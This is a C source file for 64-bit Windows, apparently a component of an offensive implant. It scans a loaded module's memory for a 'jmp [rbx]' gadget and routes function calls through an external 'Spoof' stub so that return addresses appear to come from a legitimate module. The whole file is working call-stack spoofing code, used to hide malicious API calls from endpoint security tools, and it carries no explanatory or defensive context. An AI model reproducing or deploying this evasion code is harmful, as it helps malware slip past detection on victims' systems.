#include <core/Spoof.h>
#include <core/MiniStd.h>

#if _WIN64

PVOID FindGadget(
    IN LPBYTE Module,
    IN ULONG Size
) {
    for ( int x = 0; x < Size; x++ )
    {
        if ( MemCompare( Module + x, "\xFF\x23", 2 ) == 0 )
        {
            return ( PVOID )( Module + x );
        };
    };

    return NULL;
}

PVOID SpoofRetAddr(
    IN     PVOID  Module,
    IN     ULONG  Size,
    IN     HANDLE Function,
    _Inout_ PVOID  a,
    _Inout_ PVOID  b,
    _Inout_ PVOID  c,
    _Inout_ PVOID  d,
    _Inout_ PVOID  e,
    _Inout_ PVOID  f,
    _Inout_ PVOID  g,
    _Inout_ PVOID  h
) {
    PVOID Trampoline = NULL;

    if ( Function != NULL )
    {
        Trampoline = FindGadget( Module, Size );
        if ( Trampoline != NULL ) {
            PRM param = { Trampoline, Function };
            return ( ( PVOID( * ) ( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID ) ) ( ( PVOID ) Spoof ) ) ( a, b, c, d, &param, NULL, e, f, g, h );
        }
    }

    return NULL;
}

#endif
